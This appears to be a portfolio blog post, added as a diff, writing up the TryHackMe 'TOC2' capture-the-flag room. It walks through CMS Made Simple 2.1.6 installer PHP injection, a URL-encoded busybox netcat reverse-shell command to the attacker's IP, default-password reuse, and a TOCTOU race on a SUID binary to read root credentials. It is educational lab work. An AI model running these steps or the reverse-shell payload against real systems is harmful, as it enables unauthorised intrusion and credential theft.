@@ -1,0 +1,258 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>TOCTOU CTF Writeup | Minimalist Portfolio</title>
+<link rel="stylesheet" href="/assets/css/style.css">
+
+<link rel="stylesheet" href="/assets/css/posts.css">
+
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Fira+Code:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+<link rel="icon" href="data:,">
+<meta name="description" content="Cybersecurity professional specializing in ethical hacking, penetration testing, and threat hunting.">
+<meta name="keywords" content="cybersecurity, ethical hacking, penetration testing, threat hunting, security analyst">
+</head>
+<body>
+  <!-- Spotlight Cursor Effect -->
+  <div class="spotlight"></div>
+
+  <header class="header-navbar">
+    <div class="header-inner">
+       <div class="logo-quack-wrap">
+                  <div class="logo">
+                    <span class="quack-text">QUACK</span>
+                    Gooduck
+                  </div>
+                </div>
+      <nav class="nav-links">
+        <a href="/#home">Home</a>
+        <a href="/#experience">Experience</a>
+        <a href="/#certifications">Certifications</a>
+        <a href="/write-ups.html" class="active">Write-ups</a>
+      </nav>
+      <div class="social-links">
+        <a href="https://github.com/yourusername" target="_blank"><i class="fab fa-github"></i></a>
+        <a href="https://linkedin.com/in/yourprofile" target="_blank"><i class="fab fa-linkedin"></i></a>
+        <a href="mailto:your.email@example.com"><i class="fas fa-envelope"></i></a>
+      </div>
+    </div>
+  </header>
+  <div class="container post-container">
+    <main>
+      <h1 id="toc2-ctf--write-up">TOC2 CTF – Write Up</h1>
+
+<table>
+  <tbody>
+    <tr>
+      <td><strong>Difficulty:</strong> Medium</td>
+      <td><strong>Focus:</strong> Linux, Boot2Root, Web, TOCTOU.</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Room link: https://tryhackme.com/room/toc2</p>
+
+<p>It’s a setup… Can you get the flags in time?</p>
+
+<h2 id="1-initial-enumeration">1. Initial Enumeration</h2>
+<p>We begin the engagement with an nmap scan to identify open ports and services on the target machine.</p>
+
+<p>The scan reveals two open ports:</p>
+
+<ul>
+  <li>Port 22: SSH</li>
+  <li>Port 80: HTTP (Web Server)</li>
+</ul>
+
+<div class="post-img"><img src="/assets/img/toc2/nmap.png" alt="Alt text" /></div>
+
+<h2 id="2-web-discovery--directory-bruteforcing">2. Web Discovery &amp; Directory Bruteforcing</h2>
+<p>Navigating to the website, we find an “Under Construction” page. While it mentions some potential credentials, their application isn’t immediately clear. To uncover hidden paths, I ran gobuster for directory bruteforcing.</p>
+
+<div class="post-img"><img src="/assets/img/toc2/website_username_pass.png" alt="Alt text" /></div>
+
+<div class="post-img"><img src="/assets/img/toc2/gobuster.png" alt="Alt text" /></div>
+
+<p>The scan identifies a <strong>robots.txt</strong> file. Inspecting its contents reveals an interesting installation path:</p>
+
+<ul>
+  <li><strong>hxxp[://]10.48.164.165/cmsms/cmsms-2.1.6-install.php</strong></li>
+</ul>
+
+<div class="post-img"><img src="/assets/img/toc2/robots.png" alt="Alt text" /></div>
+
+<h2 id="3-vulnerability-research">3. Vulnerability Research</h2>
+<p>The discovered directory leads to the CMS Made Simple 2.1.6 installation wizard. Researching known vulnerabilities for this version leads to EDB-ID: 44192.</p>
+
+<ul>
+  <li><strong>hxxps[://]www.exploit-db[.]com/exploits/44192</strong></li>
+</ul>
+
+<p>The exploit involves Remote Code Execution (RCE) by injecting arbitrary PHP code into the config.php file during the installation process. By providing valid database credentials and injecting code into the timezone parameter during Step 4, we can achieve persistence in the configuration file.</p>
+
+<h2 id="4-exploitation--initial-access">4. Exploitation &amp; Initial Access</h2>
+<p>Using the database credentials found during the installation steps, I injected a PHP system() function into the timezone field.</p>
+
+<div class="post-img"><img src="/assets/img/toc2/exploit.png" alt="Alt text" /></div>
+
+<p>To verify the exploit, I accessed the newly created config.php with a command parameter</p>
+
+<ul>
+  <li><strong>hxxp[://]10.48.164.165/cmsms/config.php?cmd=id</strong></li>
+</ul>
+
+<div class="post-img"><img src="/assets/img/toc2/id_exploit.png" alt="Alt text" /></div>
+
+<h2 id="5-gaining-a-reverse-shell">5. Gaining a Reverse Shell</h2>
+<p>With RCE confirmed, the next step is to catch a reverse shell. I started a netcat listener on my local machine and executed the following payload via the browser</p>
+
+<ul>
+  <li><strong>busybox%20nc%2010.48.83.150%204444%20-e%20%2Fbin%2Fbash</strong></li>
+</ul>
+
+<div class="post-img"><img src="/assets/img/toc2/reverse_shell.png" alt="Alt text" /></div>
+
+<p>Shell Stabilization
+Once connected, I stabilized the shell to allow for better interactivity. I followed the methods outlined in this guide:</p>
+
+<ul>
+  <li><strong>hxxps[://]infosecwriteups[.]com/how-to-stabilise-a-reverse-shell-using-python-da2f51c42b85</strong></li>
+</ul>
+
+<h2 id="6-lateral-movement-user-frank">6. Lateral Movement: User Frank</h2>
+<p>Enumerating the <strong>/home</strong> directory reveals a user named <strong>frank</strong>. We have read access to his home directory.</p>
+
+<p>Inside, we find <strong>user.txt</strong> (the first flag) and a file named <strong>new_machine.txt</strong>. The note explains that Frank was assigned a new Thinkpad and reveals a “default password” used for work machines. Using these credentials, I switched users to Frank</p>
+
+<div class="post-img"><img src="/assets/img/toc2/frank.png" alt="Alt text" /></div>
+<div class="post-img"><img src="/assets/img/toc2/frank_pass.png" alt="Alt text" /></div>
+<div class="post-img"><img src="/assets/img/toc2/eleavate_frank.png" alt="Alt text" /></div>
+
+<h2 id="7-privilege-escalation-toctou-attack">7. Privilege Escalation: TOCTOU Attack</h2>
+<p>In Frank’s home directory is a folder named root_access containing a SUID binary called <strong>readcreds</strong> and its source code, <strong>readcreds.c</strong>.</p>
+
+<p>The program checks if the user has permission to read a file before opening it. However, this creates a Time-of-Check to Time-of-Use (TOCTOU) vulnerability. I used the following resources to understand and execute the exploit:</p>
+
+<ul>
+  <li>
+    <p><strong>Exploit Code: hxxps[://]github[.]com/sroettger/35c3ctf_chals/blob/master/logrotate/exploit/rename.c</strong></p>
+  </li>
+  <li>
+    <p><strong>TOCTOU Concepts: hxxps[://]heinosass[.]gitbook[.]io/leet-sheet/binary-exploitation/time-of-check-to-time-of-use-toctou</strong></p>
+  </li>
+</ul>
+
+<div class="post-img"><img src="/assets/img/toc2/setup_toctou.png" alt="Alt text" /></div>
+
+<p>By rapidly swapping a file I could read with the root password backup file between the program’s “check” and “read” actions, I successfully retrieved the Root Credentials.</p>
+
+<div class="post-img"><img src="/assets/img/toc2/root_creds.png" alt="Alt text" /></div>
+
+<h2 id="8-final-flag">8. Final Flag</h2>
+<p>With the root password, I logged in as root and captured the final flag.</p>
+
+<div class="post-img"><img src="/assets/img/toc2/roottxt.png" alt="Alt text" /></div>
+
+    </main>
+  </div>
+
+  <script>
+    // Spotlight cursor effect
+    const spotlight = document.querySelector('.spotlight');
+
+    document.addEventListener('mousemove', (e) => {
+      const x = (e.clientX / window.innerWidth) * 100;
+      const y = (e.clientY / window.innerHeight) * 100;
+      spotlight.style.setProperty('--x', `${x}%`);
+      spotlight.style.setProperty('--y', `${y}%`);
+    });
+
+    // Focus effect for cards
+    document.addEventListener('DOMContentLoaded', () => {
+      const cards = document.querySelectorAll('.project-card, .job-item');
+
+      cards.forEach(card => {
+        card.addEventListener('mouseenter', () => {
+          document.body.classList.add('focus-mode');
+        });
+
+        card.addEventListener('mouseleave', () => {
+          document.body.classList.remove('focus-mode');
+        });
+      });
+
+      // Experience tabs functionality
+      const jobItems = document.querySelectorAll('.job-item');
+      const jobDetails = document.querySelector('.job-details');
+
+      jobItems.forEach((item, index) => {
+        item.addEventListener('click', () => {
+          // Remove active class from all items
+          jobItems.forEach(i => i.classList.remove('active'));
+          // Add active class to clicked item
+          item.classList.add('active');
+
+          // Update job details
+          const jobTitle = item.querySelector('h3').textContent;
+          const company = item.querySelector('.company').textContent;
+          const bullets = item.getAttribute('data-bullets').split('|');
+
+          jobDetails.querySelector('h3').textContent = jobTitle;
+          jobDetails.querySelector('.role').textContent = company;
+
+          // Update bullets
+          const ul = jobDetails.querySelector('ul');
+          ul.innerHTML = '';
+          bullets.forEach(bullet => {
+            const li = document.createElement('li');
+            li.textContent = bullet;
+            ul.appendChild(li);
+          });
+        });
+      });
+
+      // Navigation highlighting based on scroll position
+      const navLinks = document.querySelectorAll('.nav-links a');
+      const sections = document.querySelectorAll('section[id]');
+
+      function highlightNavOnScroll() {
+        const scrollY = window.pageYOffset;
+
+        sections.forEach(section => {
+          const sectionTop = section.offsetTop - 100; // Offset for better UX
+          const sectionHeight = section.offsetHeight;
+          const sectionId = section.getAttribute('id');
+
+          if (scrollY >= sectionTop && scrollY < sectionTop + sectionHeight) {
+            navLinks.forEach(link => {
+              link.classList.remove('active');
+              if (link.getAttribute('href') === `#${sectionId}`) {
+                link.classList.add('active');
+              }
+            });
+          }
+        });
+      }
+
+      // Smooth scrolling for navigation
+      navLinks.forEach(anchor => {
+        anchor.addEventListener('click', function (e) {
+          const href = this.getAttribute('href');
+          if (href.startsWith('#')) {
+            e.preventDefault();
+            const target = document.querySelector(href);
+            if (target) {
+              target.scrollIntoView({
+                behavior: 'smooth'
+              });
+            }
+          }
+          // For external links or page links, let them navigate normally
+        });
+      });
+    });
+  </script>
+</body>
+</html>
